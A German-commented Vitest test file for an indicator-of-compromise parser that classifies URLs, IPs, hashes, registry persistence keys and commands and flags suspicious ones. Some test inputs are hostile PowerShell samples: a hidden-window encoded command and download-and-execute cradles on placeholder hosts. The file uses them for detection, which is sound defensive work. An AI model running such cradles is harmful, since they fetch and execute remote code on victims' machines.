import { describe, test, expect } from 'vitest';
import { detectAndParse } from './smartParser';

// PowerShell -enc: UTF-16LE-Base64 von "whoami" (kurz, für -enc-Erkennung)
const PS_ENC = btoa('w\0h\0o\0a\0m\0i\0');
// Längeres UTF-16LE-Base64 (>20 Zeichen) von "whoami /all && net user"
const PS_ENC_LONG = btoa('whoami /all && net user'.split('').map((c) => `${c}\0`).join(''));

describe('detectAndParse — Prioritätskette des Smart-Parsers', () => {
  test('leerer Input → kein Typ', () => {
    expect(detectAndParse('   ')).toEqual({ type: '', fields: {} });
  });

  test('URL: Host/Path/Query in Notizen, verdächtige Endung markiert', () => {
    const r = detectAndParse('https://evil.example.com/drop/payload.exe?id=7');
    expect(r.type).toBe('URL');
    expect(r.fields.url).toContain('payload.exe');
    expect(r.fields.notes).toContain('Host: evil.example.com');
    expect(r.fields.notes).toContain('⚠️ Verdächtige Dateiendung: .exe');
    expect(r.fields.method).toBe('GET');
  });

  test('IPv4 privat: RFC1918-Range erkannt, Port abgetrennt', () => {
    const r = detectAndParse('192.168.241.50:3389');
    expect(r.type).toBe('IP');
    expect(r.fields.ip).toBe('192.168.241.50');
    expect(r.fields.notes).toContain('192.168.240.0/16');
    expect(r.fields.notes).toContain('Port: 3389');
  });

  test('IPv4 öffentlich → Threat-Intel-Hinweis', () => {
    const r = detectAndParse('185.220.101.5');
    expect(r.fields.notes).toContain('Öffentliche IP');
  });

  test('Email mit Typosquatting-Warnung', () => {
    const r = detectAndParse('service@paypa1-secure.com');
    expect(r.type).toBe('Email');
    expect(r.fields.notes).toContain('Typosquatting');
  });

  test('Registry-Key: Persistence-Pfad + HKCU-Kontext, Value-Name abgetrennt', () => {
    const r = detectAndParse('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater');
    expect(r.type).toBe('Registry-Key');
    expect(r.fields.valname).toBe('updater');
    expect(r.fields.notes).toContain('⚠️ Bekannter Persistence-Pfad');
    expect(r.fields.notes).toContain('HKCU');
  });

  test('Hashes: MD5/SHA1/SHA256 mit VT-Link, SHA512 ohne', () => {
    expect(detectAndParse('d41d8cd98f00b204e9800998ecf8427e').fields.algo).toBe('MD5');
    expect(detectAndParse('da39a3ee5e6b4b0d3255bfef95601890afd80709').fields.algo).toBe('SHA1');
    const sha256 = detectAndParse('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
    expect(sha256.fields.algo).toBe('SHA256');
    expect(sha256.fields.vt).toContain('virustotal.com');
    expect(detectAndParse('a'.repeat(128)).fields.algo).toBe('SHA512');
  });

  test('Domain: verdächtige TLD markiert', () => {
    const r = detectAndParse('update-server.evil.ru');
    expect(r.type).toBe('Domain');
    expect(r.fields.notes).toContain('⚠️ Verdächtige TLD: .ru');
  });

  test('File: Windows-Pfad, Temp-Verzeichnis + ausführbare Endung markiert', () => {
    const r = detectAndParse('C:\\Users\\jdoe\\AppData\\Local\\Temp\\dropper.exe');
    expect(r.type).toBe('File');
    expect(r.fields.filename).toBe('dropper.exe');
    expect(r.fields.notes).toContain('⚠️ Ausführbare Datei: .exe');
    expect(r.fields.notes).toContain('temporärem');
  });

  test('Command: PowerShell mit -enc wird dekodiert + Stealth markiert', () => {
    const r = detectAndParse(`powershell.exe -nop -w hidden -enc ${PS_ENC}`);
    expect(r.type).toBe('Command');
    expect(r.fields.shell).toBe('powershell.exe');
    expect(r.fields.notes).toContain('Decoded (-enc): whoami');
    expect(r.fields.notes).toContain('Verstecktes Fenster');
  });

  test('Command: Download-Cradle-Warnungen', () => {
    const r = detectAndParse("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')");
    expect(r.type).toBe('Command');
    expect(r.fields.notes).toContain('⚠️ Download-Technik erkannt (WebClient)');
    expect(r.fields.notes).toContain('⚠️ IEX / Invoke-Expression');
  });

  test('Base64 (PowerShell UTF-16LE) wird erkannt und dekodiert', () => {
    const r = detectAndParse(PS_ENC_LONG);
    expect(r.type).toBe('Encoded String');
    expect(r.fields.encoding).toBe('Base64');
    expect(r.fields.decoded).toBe('whoami /all && net user');
    expect(r.fields.notes).toContain('UTF-16LE');
  });

  test('Hex wird dekodiert (Länge ≠ Hash-Längen, sonst gewinnt Hash-Erkennung)', () => {
    // Hex von "whoami /all" — 22 Zeichen (kein Buffer: @types/node fehlt im Web-Build)
    const hex = '77686f616d69202f616c6c';
    const r = detectAndParse(hex);
    expect(r.type).toBe('Encoded String');
    expect(r.fields.encoding).toBe('Hex');
    expect(r.fields.decoded).toBe('whoami /all');
  });

  test('Priorität: 32 Hex-Zeichen sind ein MD5-Hash, kein Hex-String', () => {
    const hex32 = '77686f616d69202f616c6c207468656e'; // Hex von "whoami /all then"
    expect(hex32).toHaveLength(32);
    expect(detectAndParse(hex32).type).toBe('Hash');
  });

  test('Script: PowerShell-Cradle als Script erkannt (ohne Shell-Prefix)', () => {
    const r = detectAndParse("Invoke-WebRequest -Uri 'http://x/a' -OutFile a.txt\nInvoke-Expression a.txt");
    expect(r.type).toBe('Script');
    expect(r.fields.lang).toBe('PowerShell');
  });

  test('User-Agent erkannt mit Tool-Zuordnung', () => {
    const r = detectAndParse('curl/8.4.0');
    expect(r.type).toBe('User-Agent');
    expect(r.fields.tool).toBe('curl');
    expect(r.fields.notes).toContain('Sehr kurzer UA');
  });

  test('Fallback: unklassifizierbarer Text → Andere', () => {
    const r = detectAndParse('irgendein freier Text ohne Muster');
    expect(r.type).toBe('Andere');
    expect(r.fields.value).toBe('irgendein freier Text ohne Muster');
  });

  test('Priorität: URL gewinnt vor Domain, Hash vor Domain', () => {
    expect(detectAndParse('https://evil.ru/').type).toBe('URL');
    expect(detectAndParse('d41d8cd98f00b204e9800998ecf8427e').type).toBe('Hash');
  });
});
